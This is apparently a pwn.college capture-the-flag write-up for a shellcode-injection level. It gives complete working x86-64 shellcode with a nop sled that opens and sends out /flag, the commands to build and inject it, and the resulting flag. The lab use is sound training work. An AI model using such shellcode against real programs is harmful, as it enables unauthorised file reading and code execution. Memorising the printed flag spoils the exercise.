# level2
## Description
Write and execute shellcode to read the flag, but a portion of your input is randomly skipped.
## Solution
- The challenge file in `/challenge` is `babyshell-level-2`. Running it and giving it a sample input of `90` (the opcode of `nop`):
```
###
### Welcome to ./babyshell-level-2!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

In this challenge, shellcode will be copied onto the stack and executed. Since the stack location is randomized on every
execution, your shellcode will need to be *position-independent*.

Allocated 0x1000 bytes for shellcode on the stack at 0x7ffd530df950!
Reading 0x1000 bytes from stdin.

90
Executing filter...

This challenge will randomly skip up to 0x800 bytes in your shellcode. You better adapt to that! One way to evade this
is to have your shellcode start with a long set of single-byte instructions that do nothing, such as `nop`, before the
actual functionality of your code begins. When control flow hits any of these instructions, they will all harmlessly
execute and then your real shellcode will run. This concept is called a `nop sled`.

This challenge is about to execute the following shellcode:

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x00007ffd530dfc51 | 91                                            | xchg ecx, eax
0x00007ffd530dfc52 | c0 d3 f8                                      | rcl bl, 0xf8
0x00007ffd530dfc55 | 71 00                                         | jno 0x7ffd530dfc57
0x00007ffd530dfc57 | 00 dc                                         | add ah, bl
0x00007ffd530dfc59 | cb                                            | retf 
0x00007ffd530dfc5a | be d3 f8 71 00                                | mov esi, 0x71f8d3
0x00007ffd530dfc5f | 00 60 80                                      | add byte ptr [rax - 0x80], ah
0x00007ffd530dfc62 | c0 d3 f8                                      | rcl bl, 0xf8
0x00007ffd530dfc65 | 71 00                                         | jno 0x7ffd530dfc67
0x00007ffd530dfc67 | 00 00                                         | add byte ptr [rax], al
0x00007ffd530dfc69 | 00 00                                         | add byte ptr [rax], al
0x00007ffd530dfc6b | 00 00                                         | add byte ptr [rax], al
0x00007ffd530dfc6d | 00 00                                         | add byte ptr [rax], al
0x00007ffd530dfc6f | 00 00                                         | add byte ptr [rax], al
0x00007ffd530dfc71 | 00 00                                         | add byte ptr [rax], al
0x00007ffd530dfc73 | 00 00                                         | add byte ptr [rax], al
0x00007ffd530dfc75 | 00 00                                         | add byte ptr [rax], al
0x00007ffd530dfc77 | 00 e9                                         | add cl, ch
0x00007ffd530dfc79 | 44 be d3 f8 71 00                             | mov esi, 0x71f8d3
0x00007ffd530dfc7f | 00 01                                         | add byte ptr [rcx], al
0x00007ffd530dfc81 | 00 00                                         | add byte ptr [rax], al
0x00007ffd530dfc83 | 00 00                                         | add byte ptr [rax], al
0x00007ffd530dfc85 | 00 00                                         | add byte ptr [rax], al
0x00007ffd530dfc87 | 00 00                                         | add byte ptr [rax], al
0x00007ffd530dfc89 | 00 00                                         | add byte ptr [rax], al
0x00007ffd530dfc8b | 00 00                                         | add byte ptr [rax], al
0x00007ffd530dfc8d | 00 00                                         | add byte ptr [rax], al
0x00007ffd530dfc8f | 00 f8                                         | add al, bh
0x00007ffd530dfc91 | fc                                            | cld 
0x00007ffd530dfc92 | 0d 53 fd 7f 00                                | or eax, 0x7ffd53
0x00007ffd530dfc97 | 00 00                                         | add byte ptr [rax], al
0x00007ffd530dfc99 | 00 00                                         | add byte ptr [rax], al
0x00007ffd530dfc9b | 00 00                                         | add byte ptr [rax], al
0x00007ffd530dfc9d | 00 00                                         | add byte ptr [rax], al
0x00007ffd530dfc9f | 00 01                                         | add byte ptr [rcx], al
0x00007ffd530dfca1 | 00 00                                         | add byte ptr [rax], al
0x00007ffd530dfca3 | 00 00                                         | add byte ptr [rax], al
0x00007ffd530dfca5 | 00 00                                         | add byte ptr [rax], al
0x00007ffd530dfca7 | 00 00                                         | add byte ptr [rax], al
0x00007ffd530dfca9 | 00 00                                         | add byte ptr [rax], al
0x00007ffd530dfcab | 00 00                                         | add byte ptr [rax], al
0x00007ffd530dfcad | 00 00                                         | add byte ptr [rax], al
0x00007ffd530dfcaf | 00 e0                                         | add al, ah
0x00007ffd530dfcb1 | 94                                            | xchg esp, eax
0x00007ffd530dfcb2 | bc d3 f8 71 00                                | mov esp, 0x71f8d3
0x00007ffd530dfcb7 | 00 90 91 c0 d3 f8                             | add byte ptr [rax - 0x72c3f6f], dl
0x00007ffd530dfcbd | 71 00                                         | jno 0x7ffd530dfcbf
0x00007ffd530dfcbf | 00 00                                         | add byte ptr [rax], al
0x00007ffd530dfcc1 | 00 00                                         | add byte ptr [rax], al
0x00007ffd530dfcc3 | 00 00                                         | add byte ptr [rax], al
0x00007ffd530dfcc5 | 00 00                                         | add byte ptr [rax], al
0x00007ffd530dfcc7 | 00 00                                         | add byte ptr [rax], al
0x00007ffd530dfcc9 | 00 00                                         | add byte ptr [rax], al
0x00007ffd530dfccb | 00 00                                         | add byte ptr [rax], al
0x00007ffd530dfccd | 00 00                                         | add byte ptr [rax], al
0x00007ffd530dfccf | 00 0a                                         | add byte ptr [rdx], cl
0x00007ffd530dfcd1 | 00 00                                         | add byte ptr [rax], al
0x00007ffd530dfcd3 | 00 00                                         | add byte ptr [rax], al
0x00007ffd530dfcd5 | 00 00                                         | add byte ptr [rax], al
0x00007ffd530dfcd7 | 00 00                                         | add byte ptr [rax], al
0x00007ffd530dfcd9 | 00 00                                         | add byte ptr [rax], al
0x00007ffd530dfcdb | 00 00                                         | add byte ptr [rax], al
0x00007ffd530dfcdd | 00 00                                         | add byte ptr [rax], al
0x00007ffd530dfcdf | 00 00                                         | add byte ptr [rax], al
0x00007ffd530dfce1 | 00 00                                         | add byte ptr [rax], al
0x00007ffd530dfce3 | 00 00                                         | add byte ptr [rax], al
0x00007ffd530dfce5 | 00 00                                         | add byte ptr [rax], al
0x00007ffd530dfce7 | 00 00                                         | add byte ptr [rax], al
0x00007ffd530dfce9 | 00 00                                         | add byte ptr [rax], al
0x00007ffd530dfceb | 00 00                                         | add byte ptr [rax], al
0x00007ffd530dfced | 00 00                                         | add byte ptr [rax], al
0x00007ffd530dfcef | 00 e0                                         | add al, ah
0x00007ffd530dfcf1 | 94                                            | xchg esp, eax
0x00007ffd530dfcf2 | bc d3 f8 71 00                                | mov esp, 0x71f8d3
0x00007ffd530dfcf7 | 00 50 0a                                      | add byte ptr [rax + 0xa], dl

Executing shellcode!

Segmentation fault
```
- The program will skip up to `0x800` bytes of the input. It suggests that we should use a `nop sled` to evade this.
- I could just add 2048 (0x800 in decimal) `nop` instructions to the beginning of the shellcode, but I found a shorter solution. I can add the following instructions to the beginning of the shellcode:
```assembly
.rept 0x800
nop
.endr
```
- This is a macro that will repeat the `nop` instruction `0x800` times. This will make the shellcode start with `0x800` `nop` instructions. Our rest of the shellcode is same as the one used in [level1](./level1.md). Here's the full shellcode:
```assembly
.intel_syntax noprefix
    .rept 0x800
    nop
    .endr
    mov rbx, 0x00000067616c662f	# push "/flag" filename
    push rbx
    mov rax, 2				    # syscall number of open
    mov rdi, rsp				# point the first argument at stack (where we have "/flag")
    mov rsi, 0				    # NULL out the second argument (meaning, O_RDONLY)
    syscall				        # trigger open("/flag", NULL)
    mov rdi, 1				    # first argument to sendfile is the file descriptor to output to (stdout)
    mov rsi, rax				# second argument is the file descriptor returned by open
    mov rdx, 0				    # third argument is the number of bytes to skip from the input file
    mov r10, 1000				# fourth argument is the number of bytes to transfer to the output file
    mov rax, 40				    # syscall number of sendfile
    syscall				        # trigger sendfile(1, fd, 0, 1000)
    mov rax, 60				    # syscall number of exit
    syscall				        # trigger exit()
```
- I compiled it using the following command: `gcc -nostdlib -static shellcode.s -o shellcode-elf`.
- I extracted the shellcode using the following command: `objcopy --dump-section .text=shellcode-raw shellcode-elf`.
- I sent the shellcode to the `stdin` of the challenge using the following command: `cat shellcode-raw /dev/stdin | /challenge/babyshell-level-2`. This gave me the flag:
```
...
0x00007ffcdd38a65d | 90                                            | nop 
0x00007ffcdd38a65e | 90                                            | nop 
0x00007ffcdd38a65f | 90                                            | nop 
0x00007ffcdd38a660 | 48 bb 2f 66 6c 61 67 00 00 00                 | movabs rbx, 0x67616c662f
0x00007ffcdd38a66a | 53                                            | push rbx
0x00007ffcdd38a66b | 48 c7 c0 02 00 00 00                          | mov rax, 2
0x00007ffcdd38a672 | 48 89 e7                                      | mov rdi, rsp
0x00007ffcdd38a675 | 48 c7 c6 00 00 00 00                          | mov rsi, 0
0x00007ffcdd38a67c | 0f 05                                         | syscall 
0x00007ffcdd38a67e | 48 c7 c7 01 00 00 00                          | mov rdi, 1
0x00007ffcdd38a685 | 48 89 c6                                      | mov rsi, rax
0x00007ffcdd38a688 | 48 c7 c2 00 00 00 00                          | mov rdx, 0
0x00007ffcdd38a68f | 49 c7 c2 e8 03 00 00                          | mov r10, 0x3e8
0x00007ffcdd38a696 | 48 c7 c0 28 00 00 00                          | mov rax, 0x28
0x00007ffcdd38a69d | 0f 05                                         | syscall 
0x00007ffcdd38a69f | 48 c7 c0 3c 00 00 00                          | mov rax, 0x3c
0x00007ffcdd38a6a6 | 0f 05                                         | syscall 

Executing shellcode!

pwn.college{sBjXHSmleUyRuOkvQkRqAq8V2i4.0FOxIDL5QTO0czW}
```
- The flag is `pwn.college{sBjXHSmleUyRuOkvQkRqAq8V2i4.0FOxIDL5QTO0czW}`.